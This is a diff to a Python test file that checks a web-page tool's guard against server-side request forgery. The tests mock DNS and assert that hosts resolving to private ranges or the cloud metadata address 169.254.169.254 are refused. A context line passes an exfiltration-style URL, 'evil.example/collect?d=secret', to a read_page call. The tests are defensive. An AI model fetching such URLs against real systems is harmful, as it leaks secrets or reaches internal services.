@@ -7,6 +7,7 @@ engine downloads two httpx releases (CODEINTENT_RUN_NETWORK=1, as in CI).
 from __future__ import annotations
 
 import os
+import socket
 from pathlib import Path
 
 import pytest
@@ -193,7 +194,17 @@ def test_web_pages_only_open_from_this_sessions_search():
         read_page.run(url="https://evil.example/collect?d=secret")
 
 
-def test_private_addresses_are_not_web_pages():
+def _resolves_to(monkeypatch, addresses: dict[str, str]):
+    def getaddrinfo(host, *args, **kwargs):
+        if host not in addresses:
+            raise socket.gaierror(host)
+        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (addresses[host], 0))]
+
+    monkeypatch.setattr(socket, "getaddrinfo", getaddrinfo)
+
+
+def test_private_addresses_are_not_web_pages(monkeypatch):
+    _resolves_to(monkeypatch, {"github.com": "140.82.112.3"})
     assert _public("https://github.com/encode/httpx/releases")
     for url in (
         "http://127.0.0.1/",
@@ -203,6 +214,19 @@ def test_private_addresses_are_not_web_pages():
         "http://10.0.0.5/",
     ):
         assert not _public(url), url
+
+
+def test_names_that_resolve_to_private_addresses_are_not_web_pages(monkeypatch):
+    _resolves_to(
+        monkeypatch,
+        {
+            "metadata.attacker.example": "169.254.169.254",
+            "intranet.example": "10.1.2.3",
+        },
+    )
+    assert not _public("http://metadata.attacker.example/latest")
+    assert not _public("https://intranet.example/")
+    assert not _public("https://does-not-resolve.example/")
 
 
 # --- Checks on answers -----------------------------------------------------------------------------
